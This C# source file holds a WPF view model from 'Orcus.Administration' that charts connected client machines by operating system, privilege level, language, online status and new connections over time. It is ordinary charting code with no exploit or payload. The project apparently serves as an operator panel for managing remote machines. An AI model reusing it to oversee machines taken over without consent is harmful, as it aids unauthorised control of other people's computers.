using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Globalization;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using Orcus.Administration.Core;
using Orcus.Administration.ViewModels.Statistics;
using Orcus.Shared.Connection;
using OxyPlot.Axes;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels
{
    public class StatisticsViewModel : PropertyChangedBase
    {
        // ReSharper disable PossibleNullReferenceException
        private readonly Color[] _colors =
        {
            (Color) ColorConverter.ConvertFromString("#1abc9c"), (Color) ColorConverter.ConvertFromString("#3498db"),
            (Color) ColorConverter.ConvertFromString("#9b59b6"), (Color) ColorConverter.ConvertFromString("#34495e"),
            (Color) ColorConverter.ConvertFromString("#e74c3c"), (Color) ColorConverter.ConvertFromString("#e67e22"),
            (Color) ColorConverter.ConvertFromString("#f1c40f"), (Color) ColorConverter.ConvertFromString("#16a085"),
            (Color) ColorConverter.ConvertFromString("#27ae60"), (Color) ColorConverter.ConvertFromString("#d35400"),
            (Color) ColorConverter.ConvertFromString("#bdc3c7")
        };

        // ReSharper restore PossibleNullReferenceException
        private readonly ConnectionManager _connectionManager;

        private readonly Dictionary<OSType, Color> _osTypeColors = new Dictionary<OSType, Color>
        {
            {OSType.Unknown, (Color) ColorConverter.ConvertFromString("#95a5a6")},
            {OSType.Windows10, (Color) ColorConverter.ConvertFromString("#2980b9")},
            {OSType.Windows7, (Color) ColorConverter.ConvertFromString("#27ae60")},
            {OSType.Windows8, (Color) ColorConverter.ConvertFromString("#e67e22")},
            {OSType.WindowsVista, (Color) ColorConverter.ConvertFromString("#9b59b6")},
            {OSType.WindowsXp, (Color) ColorConverter.ConvertFromString("#e74c3c")}
        };

        private readonly Dictionary<OSType, string> _osTypeNames = new Dictionary<OSType, string>
        {
            {OSType.Unknown, (string) Application.Current.Resources["Unknown"]},
            {OSType.Windows10, "Windows 10"},
            {OSType.Windows7, "Windows 7"},
            {OSType.Windows8, "Windows 8"},
            {OSType.WindowsVista, "Windows Vista"},
            {OSType.WindowsXp, "Windows XP"}
        };

        private readonly Dictionary<PermissionType, Color> _permissionColors = new Dictionary<PermissionType, Color>
        {
            {PermissionType.Limited, (Color) ColorConverter.ConvertFromString("#95a5a6")},
            {PermissionType.Administrator, (Color) ColorConverter.ConvertFromString("#2980b9")},
            {PermissionType.Service, (Color) ColorConverter.ConvertFromString("#27ae60")}
        };

        private readonly Dictionary<PermissionType, string> _permissionNames = new Dictionary<PermissionType, string>
        {
            {PermissionType.Limited, (string) Application.Current.Resources["Limited"]},
            {PermissionType.Administrator, (string) Application.Current.Resources["Administrator"]},
            {PermissionType.Service, (string) Application.Current.Resources["Service"]}
        };

        private ObservableCollection<PieSegment> _clients;
        private List<ClientCountStatistic<DateTime>> _clientsConnected;
        private ObservableCollection<PieSegment> _languageSegments;
        private double _maximumClientsConnectedX;
        private double _maximumNEwClientsX;
        private double _minimumClientsConnectedX;
        private double _minimumNewClients;
        private List<ClientCountStatistic<DateTime>> _newClients;
        private ObservableCollection<PieSegment> _operatingSystemSegments;
        private ObservableCollection<PieSegment> _privilegesSegements;
        private int _selectedConnectedClientsView;
        private int _selectedNewClientsView;
        private Shared.Connection.Statistics _statistics;

        public StatisticsViewModel(ConnectionManager connectionManager)
        {
            _connectionManager = connectionManager;
            Load();
        }

        public Shared.Connection.Statistics Statistics
        {
            get { return _statistics; }
            set { SetProperty(value, ref _statistics); }
        }

        public ObservableCollection<PieSegment> OperatingSystemSegements
        {
            get { return _operatingSystemSegments; }
            set { SetProperty(value, ref _operatingSystemSegments); }
        }

        public ObservableCollection<PieSegment> Clients
        {
            get { return _clients; }
            set { SetProperty(value, ref _clients); }
        }

        public ObservableCollection<PieSegment> PrivilegesSegments
        {
            get { return _privilegesSegements; }
            set { SetProperty(value, ref _privilegesSegements); }
        }

        public ObservableCollection<PieSegment> LanguageSegments
        {
            get { return _languageSegments; }
            set { SetProperty(value, ref _languageSegments); }
        }

        public List<ClientCountStatistic<DateTime>> ClientsConnected
        {
            get { return _clientsConnected; }
            set { SetProperty(value, ref _clientsConnected); }
        }

        public List<ClientCountStatistic<DateTime>> NewClients
        {
            get { return _newClients; }
            set { SetProperty(value, ref _newClients); }
        }

        public int SelectedConnectedClientsView
        {
            get { return _selectedConnectedClientsView; }
            set
            {
                if (SetProperty(value, ref _selectedConnectedClientsView) && _statistics != null &&
                    Statistics.ClientsConnected?.Count > 0)
                {
                    var now = DateTime.Today;
                    var minDateTime = now;
                    switch (value)
                    {
                        case 0:
                            minDateTime = now.AddDays(-7);
                            ClientsConnected =
                                _statistics.ClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 1:
                            minDateTime = now.AddDays(-30);
                            ClientsConnected =
                                _statistics.ClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 2:
                            minDateTime = now.AddDays(-90);
                            ClientsConnected =
                                _statistics.ClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 3:
                            minDateTime = new DateTime(now.Year, 1, 1);
                            ClientsConnected =
                                _statistics.ClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 4:
                            ClientsConnected = _statistics.ClientsConnected;
                            minDateTime = ClientsConnected.LastOrDefault()?.Key ?? DateTime.Now;
                            break;
                    }

                    MinimumClientsConnectedX = DateTimeAxis.ToDouble(minDateTime);
                    MaximumClientsConnectedX =
                        DateTimeAxis.ToDouble(ClientsConnected.FirstOrDefault()?.Key ?? DateTime.Now);

#if DEBUG
                    if (value != 0)
                        return;

                    var list = new List<ClientCountStatistic<DateTime>>();
                    var rnd = new Random();
                    for (int i = 0; i < 8; i++)
                    {
                        list.Add(new ClientCountStatistic<DateTime>(DateTime.Today.Add(TimeSpan.FromDays(i * -1)),
                            rnd.Next(479, 600)));
                    }
                    ClientsConnected = list;
#endif
                }
            }
        }

        public int SelectedNewClientsView
        {
            get { return _selectedNewClientsView; }
            set
            {
                if (SetProperty(value, ref _selectedNewClientsView) && _statistics != null &&
                    Statistics.NewClientsConnected?.Count > 0)
                {
                    var now = DateTime.Today;
                    var minDateTime = now;
                    switch (value)
                    {
                        case 0:
                            minDateTime = now.AddDays(-7);
                            NewClients =
                                _statistics.NewClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 1:
                            minDateTime = now.AddDays(-30);
                            NewClients =
                                _statistics.NewClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 2:
                            minDateTime = now.AddDays(-90);
                            NewClients =
                                _statistics.NewClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 3:
                            minDateTime = new DateTime(now.Year, 1, 1);
                            NewClients =
                                _statistics.NewClientsConnected.Where(x => x.Key >= minDateTime).ToList();
                            break;
                        case 4:
                            NewClients = _statistics.NewClientsConnected;
                            minDateTime = NewClients.LastOrDefault()?.Key ?? DateTime.Now;
                            break;
                    }

                    MinimumNewClientsX = DateTimeAxis.ToDouble(minDateTime);
                    MaximumNewClientsX = DateTimeAxis.ToDouble(NewClients.FirstOrDefault()?.Key ?? DateTime.Now);
                }
            }
        }

        public double MinimumNewClientsX
        {
            get { return _minimumNewClients; }
            set { SetProperty(value, ref _minimumNewClients); }
        }

        public double MaximumNewClientsX
        {
            get { return _maximumNEwClientsX; }
            set { SetProperty(value, ref _maximumNEwClientsX); }
        }

        public double MinimumClientsConnectedX
        {
            get { return _minimumClientsConnectedX; }
            set { SetProperty(value, ref _minimumClientsConnectedX); }
        }

        public double MaximumClientsConnectedX
        {
            get { return _maximumClientsConnectedX; }
            set { SetProperty(value, ref _maximumClientsConnectedX); }
        }

        private async void Load()
        {
            Statistics = await Task.Run(() => _connectionManager.GetStatistics());
            OperatingSystemSegements = new ObservableCollection<PieSegment>(
                Statistics.OperatingSystems.Select(
                    x =>
                        new PieSegment
                        {
                            Name = _osTypeNames[x.Key],
                            Value = x.ClientsCount,
                            Color = _osTypeColors[x.Key]
                        }));
            Clients = new ObservableCollection<PieSegment>
            {
                new PieSegment
                {
                    Value = Statistics.ClientsOnline,
                    Name = "Online",
                    Color = (Color) ColorConverter.ConvertFromString("#27ae60")
                },
                new PieSegment
                {
                    Value = Statistics.ClientsOffline,
                    Name = "Offline",
                    Color = (Color) ColorConverter.ConvertFromString("#c0392b")
                }
            };

            PrivilegesSegments =
                new ObservableCollection<PieSegment>(
                    Statistics.Permissions.Select(
                        x =>
                            new PieSegment
                            {
                                Name = _permissionNames[x.Key],
                                Color = _permissionColors[x.Key],
                                Value = x.ClientsCount
                            }));

            int colorCounter = 0;
            var random = new Random();
            LanguageSegments =
                new ObservableCollection<PieSegment>(
                    Statistics.Languages.Select(
                        x =>
                            new PieSegment
                            {
                                Name = GetCultureNameSafe(x.Key),
                                Value = x.ClientsCount,
                                Color =
                                    colorCounter == _colors.Length - 1
                                        ? _colors[random.Next(0, _colors.Length)]
                                        : _colors[colorCounter++]
                            }));

            SelectedConnectedClientsView = 1;
            SelectedNewClientsView = 1;
        }

        private string GetCultureNameSafe(string name)
        {
            try
            {
                return new CultureInfo(name).EnglishName;
            }
            catch (Exception)
            {
                return string.Format((string) Application.Current.Resources["UnknownRegion"], name);
            }
        }
    }
}